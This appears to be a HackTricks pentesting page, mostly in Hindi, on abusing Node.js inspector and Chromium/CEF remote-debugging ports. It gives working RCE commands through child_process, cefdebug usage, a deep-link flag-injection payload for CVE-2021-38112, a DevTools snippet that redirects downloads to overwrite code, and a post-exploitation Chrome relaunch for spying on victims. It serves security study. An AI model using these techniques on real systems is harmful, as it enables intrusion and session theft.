# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

ऐतिहासिक practical examples में Multimaster walkthrough और CVE-2019-1414 Visual Studio Code debugger attack शामिल हैं; इन्हें version-specific context के रूप में उपयोग करें, न कि यह मानें कि हर वर्तमान Electron या Chromium target में समान primitives उपलब्ध होते हैं।<sup>[[1]](#references)[[3]](#references)</sup>

## मूल जानकारी

[दस्तावेज़ों से](https://nodejs.org/learn/getting-started/debugging): `--inspect` switch के साथ शुरू किए जाने पर, Node.js process debugging client के लिए listen करता है। **डिफ़ॉल्ट** रूप से, यह host और port **`127.0.0.1:9229`** पर listen करेगा। प्रत्येक process को एक **unique** **UUID** भी assign किया जाता है।<sup>[[4]](#references)</sup>

Connect करने के लिए Inspector clients को host address, port और UUID का पता होना और उन्हें specify करना आवश्यक है। एक पूर्ण URL कुछ इस तरह दिखाई देगा: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`।<sup>[[4]](#references)</sup>

> [!WARNING]
> चूँकि **debugger को Node.js execution environment तक full access प्राप्त होता है**, इस port से connect करने में सक्षम malicious actor Node.js process की ओर से arbitrary code execute कर सकता है (**potential privilege escalation**)।<sup>[[4]](#references)</sup>

Inspector शुरू करने के कई तरीके हैं:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
जब आप किसी inspected process को start करेंगे, तो कुछ ऐसा दिखाई देगा:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
**CEF** (**Chromium Embedded Framework**) पर आधारित processes `--remote-debugging-port=9222` के साथ debugger expose कर सकते हैं। यह browser को Node.js inspector के बजाय [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) के माध्यम से expose करता है, इसलिए Node.js `process`-आधारित payloads डिफ़ॉल्ट रूप से सीधे लागू नहीं होते हैं।<sup>[[2]](#references)[[5]](#references)</sup>

जब आप debug किए गए browser को start करते हैं, तो कुछ इस तरह दिखाई देगा:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets और same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Web-browser में खुली websites browser security model के अंतर्गत WebSocket और HTTP requests भेज सकती हैं। **एक initial HTTP connection** **unique debugger session id प्राप्त करने** के लिए आवश्यक है। **same-origin-policy** websites को **यह HTTP connection बनाने** से **रोकती है**। [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)** के विरुद्ध अतिरिक्त security के लिए,** Node.js यह verify करता है कि connection के **'Host' headers** में या तो **IP address** या सटीक रूप से **`localhost`** निर्दिष्ट हो।<sup>[[4]](#references)</sup>

> [!TIP]
> यह **security measure inspector का exploitation करके** **सिर्फ एक HTTP request भेजकर** code चलाने से रोकता है (जो SSRF vuln का exploitation करके किया जा सकता था)।<sup>[[4]](#references)</sup>

### Running processes में inspector शुरू करना

आप किसी running nodejs process को **signal SIGUSR1** भेजकर उसे default port पर **inspector शुरू** करने के लिए कह सकते हैं। हालांकि, ध्यान रखें कि आपके पास पर्याप्त privileges होना आवश्यक है, इसलिए इससे आपको **process के अंदर मौजूद information तक privileged access** मिल सकता है, लेकिन direct privilege escalation नहीं।<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> यह containers में उपयोगी है क्योंकि `--inspect` के साथ **process को बंद करके नया process शुरू करना** **विकल्प नहीं है**, क्योंकि process के साथ **container** भी **kill** हो जाएगा।<sup>[[6]](#references)</sup>

### inspector/debugger से connect करें

**Chromium-based browser** से connect करने के लिए Chrome या Edge में क्रमशः `chrome://inspect` या `edge://inspect` URLs access किए जा सकते हैं। Configure button पर click करके यह सुनिश्चित किया जाना चाहिए कि **target host और port** सही रूप से listed हों। यह image Remote Code Execution (RCE) का उदाहरण दिखाती है:<sup>[[2]](#references)[[4]](#references)</sup>

![Debugger को access करने के लिए एक URL दिखाई देगा। उदाहरण के लिए ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - inspector/debugger से connect करें: **Chromium-based browser** से connect करने के लिए,...](<../../images/image (674).png>)

**command line** का उपयोग करके आप debugger/inspector से connect कर सकते हैं:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
यह tool locally चल रहे **inspectors को find** करने और उनमें **code inject** करने की अनुमति देता है।<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> ध्यान दें कि [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) के ज़रिए किसी browser से **connect** होने पर **NodeJS RCE exploits काम नहीं करेंगे** (इसके API को check करना होगा ताकि इसके साथ करने योग्य दिलचस्प चीज़ें मिल सकें)।<sup>[[2]](#references)[[5]](#references)</sup>

## NodeJS Debugger/Inspector में RCE

> [!TIP]
> यदि आप यह जानने के लिए यहाँ आए हैं कि [**Electron में XSS से RCE कैसे प्राप्त करें, तो इस page को check करें।**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

जब आप किसी Node **inspector** से **connect** कर सकते हैं, तो **RCE** प्राप्त करने के कुछ सामान्य तरीकों में निम्न जैसा कुछ उपयोग करना शामिल है (ऐसा लगता है कि यह **Chrome DevTools protocol से connection** में काम नहीं करेगा):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

आप API यहाँ देख सकते हैं: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)।<sup>[[5]](#references)</sup>
इस section में मैं केवल उन दिलचस्प चीज़ों की सूची दूँगा, जिनका उपयोग लोगों ने इस protocol का exploit करने के लिए किया है।

### Parameter Injection via Deep Links

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) में Rhino security ने पाया कि CEF पर आधारित एक application ने system में एक custom UR**I** (workspaces://index.html) **register** किया था, जो पूरा URI प्राप्त करता था और फिर उस URI से आंशिक रूप से configuration तैयार करके **CEF पर आधारित applicatio**n को launch करता था।<sup>[[8]](#references)</sup>

यह पता चला कि URI parameters को URL decoded किया जाता था और CEF basic application को launch करने के लिए उपयोग किया जाता था, जिससे user **`--gpu-launcher`** flag को **command line** में **inject** कर सकता था और arbitrary चीज़ें execute कर सकता था।<sup>[[8]](#references)</sup>

इसलिए, एक payload ऐसा हो सकता है:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
calc.exe execute करेगा।<sup>[[8]](#references)</sup>

### फ़ाइलें ओवरराइट करें

वह फ़ोल्डर बदलें जहाँ **download की गई फ़ाइलें सहेजी जाएँगी** और किसी फ़ाइल को download करके application के अक्सर उपयोग किए जाने वाले **source code** को अपने **malicious code** से **ओवरराइट** करें।<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE और exfiltration

STAR Labs ने दिखाया कि exposed WebDriver/CDP services arbitrary file reads और RCE को सक्षम कर सकती हैं; कुछ configurations में DNS rebinding exploit chain को पूरा कर सकती है।<sup>[[9]](#references)</sup>

अतिरिक्त historical browser-automation और Chromium security cases के लिए, Counter WebDriver write-up और Project Zero issues 773, 1742, तथा 1944 देखें।<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Post-Exploitation

एक वास्तविक environment में और Chrome/Chromium based browser इस्तेमाल करने वाले user PC को **compromising करने के बाद**, आप **debugging activated और debugging port को port-forward करके** Chrome process launch कर सकते हैं, ताकि आप उस तक access कर सकें। इस तरह आप **victim द्वारा Chrome के साथ की जाने वाली हर गतिविधि को inspect कर सकते हैं और sensitive information चुरा सकते हैं**।<sup>[[7]](#references)</sup>

Stealth तरीका यह है कि **हर Chrome process को terminate करें** और फिर कुछ इस तरह call करें:<sup>[[7]](#references)</sup>
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger का inspection और exploitation tool](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Chrome DevTools Debugger के माध्यम से Visual Studio Code Remote Code Execution](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - शुरुआत करना](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Chrome के Debugging Feature का दुरुपयोग करके Browsing Sessions को remotely observe और control करना](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - DNS Rebinding और CDP के माध्यम से WebDriver RCE (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Bot से RCE तक](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
{{#include ../../banners/hacktricks-training.md}}
